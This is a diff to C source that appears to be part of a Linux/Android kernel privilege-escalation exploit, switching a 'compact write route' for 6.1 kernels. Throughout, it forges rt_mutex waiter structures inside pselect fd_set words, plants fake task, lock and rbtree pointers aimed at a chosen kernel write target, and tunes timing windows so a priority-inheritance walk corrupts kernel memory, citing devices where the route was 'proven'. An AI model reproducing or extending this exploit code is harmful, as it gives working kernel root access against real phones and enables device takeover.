@@ -12,7 +12,11 @@ int route_last_errno;
 
 static int route_delay_usec(int attempt) {
   (void)attempt;
-  /* Let select() establish its stack frame before the PI walk. */
+  /* 6.1 write route fires the consumer immediately (rmp src/61/fops.c);
+   * 6.6 lets select() establish its stack frame first. */
+  if (active_offsets && active_offsets->compact_waiter) {
+    return 0;
+  }
   return PSELECT_ENTER_DELAY_USEC;
 }
 
@@ -76,25 +80,24 @@ static void pselect_put_waiter_word(
 
 void open_selected_fds(
     fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd) {
-  /* All bit positions get the READ end so nothing is ever ready and pselect
-   * blocks: the PI walk needs the waiter parked inside the syscall while the
-   * consumer fires sched_setattr at +delay.  This matches RMG slide_app.c
-   * (the proven 6.1 compact path).  The write-end dup from RMG fops.c is the
-   * 6.6 main route — an empty pipe write end is instantly writable, which
-   * made pselect return immediately (ret = popcount of fake_task bits < 320)
-   * and the consumer always missed the go window. */
-  (void)write_fd;
-  int high_read = fcntl(read_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 32);
-  if (high_read < 0) {
-    pr_warning("pselect F_DUPFD read errno=%d\n", errno);
+  /* Write-end dup when the compact write route is active: every crafted fd
+   * is instantly writable, so pselect returns fast and the rb erase/write
+   * happens during return copyout (rmp src/61/fops.c). The read-end dup
+   * keeps the 6.6 route parked for the whole timeout window. */
+  int use_write = active_offsets && active_offsets->compact_waiter &&
+                  pselect_custom_write;
+  int dup_fd = use_write ? write_fd : read_fd;
+  int high = fcntl(dup_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 32);
+  if (high < 0) {
+    pr_warning("pselect F_DUPFD errno=%d\n", errno);
     return;
   }
   for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
     if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
-      dup2(high_read, fd);
+      dup2(high, fd);
     }
   }
-  close(high_read);
+  close(high);
   dup2(read_fd, PSELECT_ROUTE_NFDS - 1);
   FD_SET(PSELECT_ROUTE_NFDS - 1, ex);
 }
@@ -114,32 +117,17 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
   };
 
   if (compact) {
-    /* 6.1 COMPACT_RT_MUTEX_WAITER layout (Root-My-Galaxy / Pixel 6.1):
-     * tree_entry[0x18] pi_tree_entry[0x18] task@0x30 lock@0x38
-     * wake_state@0x40 prio@0x44 deadline@0x48 ww_ctx@0x50.
-     *
-     * fd_set word w lands at waiter qword (w - pselect_waiter_shift - 2);
-     * 6.1 shift=1 puts waiter base 3 qwords above fd_set word 0 (words_per_set=5):
-     * tree_pc->in[3], task->out[4], lock->ex[0], wake_prio->ex[1].
-     * Honor the per-device shift like the 6.6 path below.
-     *
-     * tree/pi parents and children carry the proven RMG slide values
-     * (slide_app.c words 0-7): parent = data-alias of loggers[0].list,
-     * left = data-alias of the random_table boot_id .data pointer — both
-     * real kernel objects with a live rbtree-compatible shape, so the PI
-     * walk erases/reinserts against memory that exists instead of
-     * dereferencing NULL tree pointers (the pre-fix consumer panic). */
-    /* waiter->task must be a real task_struct: the PI walk reads many fields
-     * we don't plant, and the rest of the page is 0x41 filler. */
-
+    /* 6.1 compact write route (rmp src/61/fops.c): tree/pi parents carry
+     * the write value, children the write target; waiter->task is the
+     * payload fake_task (planted fields for the PI walk). */
     struct pselect_waiter_word words[] = {
-      {2, SLIDE_LOGGERS_0_1, "tree_pc"},
+      {2, fake_right, "tree_pc"},
       {3, 0, "tree_right"},
-      {4, SLIDE_RANDOM_BOOT_ID_DATA, "tree_left"},
-      {5, SLIDE_LOGGERS_0_1, "pi_pc"},
+      {4, pselect_custom_target, "tree_left"},
+      {5, fake_right, "pi_pc"},
       {6, 0, "pi_right"},
-      {7, SLIDE_RANDOM_BOOT_ID_DATA, "pi_left"},
-      {8, SLIDE_INIT_TASK, "task"},
+      {7, pselect_custom_target, "pi_left"},
+      {8, fake_task, "task"},
       {9, fake_lock, "lock"},
       {10, ((uint64_t)FAKE_WAITER_PRIO << 32) | 3, "wake_prio"},
       {11, 0, "deadline"},
@@ -193,13 +181,18 @@ void do_pselect_fake_lock_route(void) {
 
   int compact_route = active_offsets && active_offsets->compact_waiter;
 
-  /* Block on a timerfd (never ready) so select/pselect parks the waiter for
-   * the whole timeout window (both routes — same as HEAD). */
-  int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
-  if (block_fd < 0) {
-    pr_warning("pselect timerfd_create failed errno=%d; using pipe read end\n",
-               errno);
+  /* 6.1 write route blocks on the plain pipe read end (rmp src/61/fops.c);
+   * 6.6 parks on a never-ready timerfd for the whole timeout window. */
+  int block_fd;
+  if (compact_route) {
     block_fd = pipefd[0];
+  } else {
+    block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
+    if (block_fd < 0) {
+      pr_warning("pselect timerfd_create failed errno=%d; using pipe read end\n",
+                 errno);
+      block_fd = pipefd[0];
+    }
   }
   int high_read = fcntl(block_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 16);
   if (high_read < 0) {
@@ -245,11 +238,9 @@ void do_pselect_fake_lock_route(void) {
   errno = 0;
   int ret;
   if (compact_route) {
-    /* 6.1 compact: pselect() with the RMG {1, 0} timeout — the long window
-     * guarantees the consumer's 50ms enter delay lands inside the call even
-     * when crafted fd bits make it return early (proven on ROG8 6.1.162). */
+    /* 6.1 write route: 5s pselect timeout (rmp src/61/fops.c). */
     struct timespec ts = {
-      .tv_sec = 1,
+      .tv_sec = 5,
       .tv_nsec = 0,
     };
     ret = pselect(PSELECT_ROUTE_NFDS, &in, &out, &ex, &ts, NULL);
